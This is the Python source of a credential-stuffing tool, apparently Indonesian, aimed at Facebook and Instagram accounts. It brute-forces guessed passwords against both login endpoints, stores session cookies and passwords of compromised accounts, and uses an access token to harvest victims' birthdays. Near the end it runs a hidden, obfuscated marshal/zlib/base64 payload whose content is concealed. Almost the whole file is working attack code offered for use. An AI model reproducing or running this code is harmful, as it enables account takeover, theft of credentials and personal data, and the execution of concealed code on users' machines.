        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s  ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %s*--> %s ◊ %s              ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        
def crack2(user, pwx):
	global looping, loping
	c_bff_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
				print "\r "+rm+"*--> %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_bff_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				# print ("\r",data)
				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
				if "checkpoint_url" in str(data):
					cepeh = "Checkpoint"
					ingfo(user, pw, cepeh)
					with open("cepeh.txt", "a") as simpan:
						simpan.write(" [Checkpoint] "+user+" ◊ "+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					okeh = "Berhasil"
					if len(status_foll) != 1:
						ingfo(user, pw, okeh)
						with open("okeh.txt", "a")as simpan:
							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
						ok.append(user)
						#follow(ses,user)
					break
				elif "Please wait" in str(data):
					print ("\r%s[!] Mode pesawatkan 2 detik  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s[!] Tidak ada koneksi Internet "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None

# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
	print (" [%s02%s] Cek user agent "%(K,P))
	print (" [%s00%s] Kembali "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
        
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
    print (' [%s01%s] Dump id public'%(K,P)) 
    print (' [%s02%s] Dump id followers'%(K,P)) 
    print (' [%s03%s] Dump id reaction post'%(K,P))
    print (' [%s04%s] Crack cari nama (instagram) '%(K,P))
    print (' [%s05%s] %sStart crack %s'%(K,P,H,P)) 
    print (' [%s06%s] Setting user agent'%(K,P)) 
    print (' [%s07%s] Cek hasil crack'%(K,P)) 
    #print (' [%s08%s] Gabung group'%(K,P))
    #print (' [%s09%s] Info script'%(K,P))
    print (' [%s00%s] Hapus token '%(M,P))
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
    	igg()
    elif unik in['5','05']:
        ngentod().romiy()
    elif unik in['6','06']:
    	useragent()
    elif unik in['7','07']:
    	print "\n%s [01] Hasil crack akun facebook "%(P)
        print "%s [02] Hasil crack akun instagram "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,K))
    	hasill(c)
    elif unik in['8','08']:
        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
    elif unik in['9','09']:
        print(ingfo)
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [√] berhasil terhapus '%(H));exit()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
        
def hasill(c):
	if c in[""]:
		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
	elif c in["1","01"]:
		try:
			dirs = os.listdir("hasil")
			print ("")
			for file in dirs:
				print("%s -> %s%s"%(K,P,file));jeda(0.2)
			print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
			file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
			if file == "":
				print("%s [!] file tidak ada "%(M))
			total = open("hasil/%s"%(file)).read().splitlines()
			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			nm_file = ("%s"%(file)).replace("-", " ")
			jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			for akun in total:
				fb = akun.replace("\n","")
				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
				print(tling);jeda(0.03)
			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
		except (IOError):
			print("\n%s [!] tidak ada hasil "%(M))
			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
	elif c in["2","02"]:
		print "\n%s [01] Hasil crack akun %sOK "%(P,H)
        print "%s [02] Hasil crack akun %sCP "%(P,K)
        while True:
        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
		if rom in['1','01']:
			try:
				oke = open("okeh.txt", "r").readlines()
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total akun : %s%s"%(K,P,H,str(len(oke))))
				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,H));jeda(2)
				okek = open("okeh.txt", "r").read()
				print (okek)
				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] tidak ada hasil awokawokawok")
		elif rom in['2','02']:
			try:
				cepe = open("cepeh.txt", "r").readlines()
				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
				jalan(" [%s*%s] total akun : %s%s"%(K,P,K,str(len(cepe))))
				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,K));jeda(2)
				cepek = open("cepeh.txt", "r").read()
				print (cepek)
				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
			except IOError,KeyError:
				exit (M+"\n [!] tidak ada hasil awokawokawok")
		else:
			exit()
			
def igg():
	print ("\n%s [%s!%s] Cth nama %s: %sRomi "%(P,M,P,M,K))
	usr_ = raw_input('%s [?] Input nama > %s'%(P,K))
	jumlah = input('%s [?] Limit user > %s'%(P,K))
	bff_2 = usr_.replace(" ", "")
	cr.append("romi_afrizal")
	mi.append(bff_2+"|"+bff_2)
	mi.append(bff_2+"_"+"|"+bff_2)
	for _i_ in range(1, jumlah+1):
		mi.append(bff_2+str(_i_)+"|"+bff_2)
		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
	print '%s [%s*%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_bff_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_bff_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							_bff_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
					else:
						_bff_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_bff_.append(_m_)
						else:
							if len(_i_) >= 2:
								_bff_.append(_i_[0]+_i_[1])
							_bff_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_bff_.append(_m_)
				else:
					_bff_.append(_i_[0]+"123")
					_bff_.append(_i_[0]+"12345")
					_bff_.append(_o_)
				log.submit(crack2, _o_, _bff_)
			except: pass
	exit("%s• finished"%(H))
	
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
      
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()    